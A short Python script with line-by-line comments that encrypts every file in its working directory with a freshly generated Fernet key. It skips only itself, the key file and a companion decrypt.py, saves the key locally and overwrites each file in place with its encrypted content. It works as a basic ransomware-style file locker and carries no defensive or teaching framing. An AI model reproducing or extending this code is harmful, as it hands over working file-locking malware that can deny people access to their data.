import os											#importing os module
from cryptography.fernet import Fernet								#importing fernet from crytography
files= []											#making a array to store files
for file in os.listdir():
	if file == "encrypt.py" or file == "actual_key.key" or file == "decrypt.py":		#if these files are found
		continue									#don't encrypt, and continue
	files.append(file)									#Put all rest of the files in the array
print (files)											#Print all the contents except the one we excluded
key = Fernet.generate_key()									#key generation
with open("actual_key.key","wb") as actual_key:							#make file where the key is generated
	actual_key.write(key)									#write the key as the one generated now
for file in files:
	with open(file,"rb") as file1:								#read the files in binary and put in file1
		content= file1.read()								#read all the files and put in variable content
	encrypt_content= Fernet(key).encrypt(content)						#encryption of the content with the key generated
	with open(file,"wb") as file1:								#write the filles in binary of file1
		file1.write(encrypt_content)							#encrypt all the content by overwriting it in binary
